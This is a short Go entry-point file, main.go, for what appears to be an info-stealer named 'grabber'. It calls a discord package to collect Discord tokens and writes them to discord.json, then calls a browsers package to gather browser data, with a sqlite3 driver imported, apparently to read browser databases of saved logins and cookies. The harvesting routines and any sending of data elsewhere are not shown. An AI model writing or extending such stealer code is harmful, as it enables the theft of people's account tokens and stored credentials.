// main.go
package main

import (
	"os"

	"example.com/grabber/browsers"
	"example.com/grabber/discord"
	_ "github.com/mattn/go-sqlite3"
)

func main() {
	os.WriteFile("discord.json", []byte(discord.GetTokens()), 0644)
	browsers.GetBrowserData()
}
